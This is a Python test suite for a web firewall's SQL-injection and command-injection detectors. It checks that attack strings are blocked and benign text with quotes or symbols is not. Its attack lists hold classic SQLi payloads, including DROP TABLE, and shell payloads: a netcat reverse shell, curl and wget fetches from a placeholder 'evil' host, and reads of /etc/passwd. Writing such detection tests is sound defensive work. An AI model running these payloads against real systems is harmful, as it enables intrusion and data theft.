"""
AEGIS request-side PARSE-PROOF oracles — sql_injection_breakout / command_injection_breakout.

These judge a single DECODED request-parameter value on the REQUEST ALONE and fire ONLY on a
deterministic parse-proof that the value breaks grammar (a structured injection ATTEMPT), never on a
raw signature. The two properties that matter:

  * PROVEN attacks fire (so the gateway can block them with a re-runnable certificate), AND
  * benign inputs with quotes / metacharacters do NOT fire (near-zero false positives — the whole
    point of a provable firewall vs a regex WAF).

Plus: the classes are oracle-vocabulary members (KnownBugClass-valid), the full confirm path works,
the certificate re-verifies offline, and the new OracleKind members stay OUT of the frozen
_ALL_ORACLES fallback so `make gate` is byte-identical.
"""

from __future__ import annotations

import pytest

from framework.v2.verify.adapter import FindingContext
from framework.v2.verify.confirmation import confirm_finding
from framework.v2.verify.models import OracleKind
from framework.v2.verify.oracles import (
    command_injection_breakout_oracle,
    sql_injection_breakout_oracle,
)
from framework.v2.verify.reverify import reverify_context
from framework.v2.verify.verifier import _ALL_ORACLES, known_bug_classes, require_known_bug_class

# --------------------------------------------------------------------------- SQLi break-out

# Deliberately-unbalanced tautologies (the trailing quote is left open for the app's own quote),
# UNION-based, stacked, comment-terminated with structure — all classic, all near-zero-benign.
_SQLI_ATTACKS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1' AND '1'='1",
    "admin' OR 'a'='a",
    '" OR "1"="1',
    "') OR 1=1#",
    "1' UNION SELECT password FROM users--",
    "'; DROP TABLE users;--",
    "1'or'1'='1",
    "admin'--",                                # comment-terminated auth bypass (anchored to the quote)
]

# Quotes + SQL words + "N or M" phrasing are ubiquitous in ordinary human input; NONE may fire (a
# false positive breaks a real user — the cardinal sin of a firewall). These are the exact benign
# strings the adversarial review proved the first cut wrongly blocked (anchoring the structure to the
# break-out quote is what fixes them).
_SQLI_BENIGN = [
    "O'Brien", "O'Reilly's book", "it's a test", "I can't OR won't", "don't",
    "Bob's OR Alice", "3 OR more items", "SELECT your seat", "café", "user@example.com",
    "size 10x20", "quantity=5", "a=b", "hello world",
    "Don't drop the ball; I'll update you", "I've got 5 or 6 options", "it's 4 or 5 apples",
    "I'll take 2 or 3", "I'm a member of the credit union, please select my account",
    "The workers' union will select delegates", "Customer O'Brien wants 2 or 3 licenses.",
]


@pytest.mark.parametrize("payload", _SQLI_ATTACKS)
def test_sqli_breakout_fires_on_proven_injection(payload: str):
    sig = sql_injection_breakout_oracle(payload, param="q")
    assert sig.fired and sig.confidence >= 0.7, f"missed a structured SQLi attempt: {payload!r}"
    assert sig.observed.get("break_out") is True


@pytest.mark.parametrize("payload", _SQLI_BENIGN)
def test_sqli_breakout_never_fires_on_benign(payload: str):
    sig = sql_injection_breakout_oracle(payload, param="name")
    assert not sig.fired, f"FALSE POSITIVE on benign input: {payload!r} — would break a real user"


# --------------------------------------------------------------------------- command-injection

_CMDI_ATTACKS = [
    "; cat /etc/passwd", "| nc 10.0.0.1 4444 -e /bin/sh", "&& curl http://evil/x",
    "$(sleep 5)", "x || wget http://evil/sh", "$(cat /etc/passwd)", "`curl http://evil/x`",
]

# Separators, command-like English words, jQuery `$(id)`, and markdown code spans are ubiquitous; NONE
# may fire. These include the exact benign strings the adversarial review proved the first cut blocked
# (requiring a shell ARGUMENT next to the command is what fixes them).
_CMDI_BENIGN = [
    "Tom & Jerry", "a; b", "rock & roll", "`code`", "1|2|3", "path/to/file",
    "AT&T", "salt & pepper", "if (a && b)", "foo;bar;baz", "R&D dept", "$5.00",
    "eat; sleep; repeat", "dog|cat", "Name | Age | ID", "user | id", "; cat food",
    "Good night.\nSleep well", "red|curl the ribbon", "use `id`", "$(id)", "`whoami`",
    "$(document).ready", "reading\nsleep\ngaming",
]


@pytest.mark.parametrize("payload", _CMDI_ATTACKS)
def test_cmdi_breakout_fires_on_proven_injection(payload: str):
    sig = command_injection_breakout_oracle(payload, param="host")
    assert sig.fired and sig.confidence >= 0.7, f"missed a command-injection construct: {payload!r}"
    assert sig.observed.get("construct") in {"substitution", "separator+command"}


@pytest.mark.parametrize("payload", _CMDI_BENIGN)
def test_cmdi_breakout_never_fires_on_benign(payload: str):
    sig = command_injection_breakout_oracle(payload, param="q")
    assert not sig.fired, f"FALSE POSITIVE on benign input: {payload!r} — would break a real user"


# --------------------------------------------------------------------------- integration + gate

def test_classes_are_oracle_vocabulary_members():
    for c in ("sqli_attempt", "command_injection_attempt"):
        assert c in known_bug_classes()
        assert require_known_bug_class(c) == c


def test_full_confirm_path_and_certificate_reverifies():
    """The gateway's path: build a FindingContext from the decoded value, confirm via the oracle,
    then the retained certificate RE-FIRES offline (prove-don't-guess)."""
    fc = FindingContext.from_request_payload("' OR '1'='1", bug_class="sqli_attempt", param="q")
    confirmed = confirm_finding({"bug_class": "sqli_attempt"}, context=fc)
    assert confirmed is not None
    assert confirmed.confirmed_by is OracleKind.SQL_INJECTION_BREAKOUT
    r = reverify_context(fc.to_verifier_context(), bug_class="sqli_attempt",
                         claimed_confirmed_by="sql_injection_breakout",
                         claimed_confidence=confirmed.confidence)
    assert r.ok, "the block certificate did not re-verify offline"


def test_benign_never_confirms_through_the_full_path():
    fc = FindingContext.from_request_payload("O'Brien", bug_class="sqli_attempt", param="name")
    assert confirm_finding({"bug_class": "sqli_attempt"}, context=fc) is None


def test_new_kinds_excluded_from_frozen_fallback_gate_byte_identical():
    """The new OracleKind members must NOT be in the frozen unknown-class fallback, so appending them
    cannot grow the oracle set any pre-existing/unknown class runs — `make gate` stays byte-identical."""
    assert OracleKind.SQL_INJECTION_BREAKOUT not in _ALL_ORACLES
    assert OracleKind.COMMAND_INJECTION_BREAKOUT not in _ALL_ORACLES


def test_determinism_same_value_same_signal():
    a = sql_injection_breakout_oracle("' OR '1'='1", param="q")
    b = sql_injection_breakout_oracle("' OR '1'='1", param="q")
    assert (a.fired, a.confidence, a.evidence) == (b.fired, b.confidence, b.evidence)
